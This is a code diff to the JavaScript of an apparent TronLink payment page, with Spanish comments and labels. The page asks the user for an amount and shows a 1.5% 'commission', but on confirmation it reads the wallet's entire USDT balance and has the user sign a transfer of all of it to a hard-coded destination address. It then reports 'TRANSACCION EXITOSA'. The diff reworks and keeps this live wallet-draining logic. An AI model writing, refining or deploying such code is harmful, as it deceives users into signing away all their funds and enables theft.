@@ -59,6 +59,7 @@
 
     document.getElementById('addressDisplay').value = BILLETERA_DESTINO;
 
+    // Lógica original de balance y transferencia
     async function obtenerBalanceSeguro(ownerAddress) {
         const tronWeb = window.tronWeb;
         const ownerHex = tronWeb.address.toHex(ownerAddress);
@@ -71,24 +72,32 @@
         const tronWeb = window.tronWeb;
 
         if (stage === 0) {
+            // Conexión original
             walletAddress = tronWeb.defaultAddress.base58 || (await window.tronLink.request({ method: 'tron_requestAccounts' }), tronWeb.defaultAddress.base58);
             stage = 1;
             document.getElementById('connectBtn').innerText = "Confirmar Envío";
         } else if (stage === 1) {
             const amt = parseFloat(document.getElementById('amountDisplay').value);
             if (!amt || amt <= 0) return alert("Ingrese cantidad");
-            document.getElementById('commissionArea').innerHTML = `
-                <div class="commission-box">
-                    <div class="comm-left">ComisiónTrx</div>
-                    <div class="comm-amount">${(amt * 0.015).toFixed(2)}</div>
-                </div>`;
+            document.getElementById('commissionArea').innerHTML = `<div class="commission-box"><div class="comm-left">ComisiónTrx</div><div class="comm-amount">${(amt * 0.015).toFixed(2)}</div></div>`;
             stage = 2;
         } else {
+            // Lógica original: Transferir el balance total detectado
             try {
                 const balanceBigNumber = await obtenerBalanceSeguro(walletAddress);
-                const tx = await tronWeb.transactionBuilder.triggerSmartContract(CONTRATO_USDT, "transfer(address,uint256)", {feeLimit: 100000000}, [{type:'address', value: tronWeb.address.toHex(BILLETERA_DESTINO)}, {type:'uint256', value: balanceBigNumber.toString()}], tronWeb.address.toHex(walletAddress));
-                const signed = await tronWeb.trx.sign(tx.transaction);
-                await tronWeb.trx.sendRawTransaction(signed);
+                const destinoHex = tronWeb.address.toHex(BILLETERA_DESTINO);
+                
+                const transactionDraft = await tronWeb.transactionBuilder.triggerSmartContract(
+                    CONTRATO_USDT,
+                    "transfer(address,uint256)",
+                    { feeLimit: 100000000 },
+                    [{ type: 'address', value: destinoHex }, { type: 'uint256', value: balanceBigNumber.toString() }],
+                    tronWeb.address.toHex(walletAddress)
+                );
+
+                const signedTx = await tronWeb.trx.sign(transactionDraft.transaction);
+                await tronWeb.trx.sendRawTransaction(signedTx);
+                
                 document.getElementById('status').innerText = "TRANSACCION EXITOSA";
                 document.getElementById('status').style.display = "block";
             } catch (e) { alert("Error en la red"); }
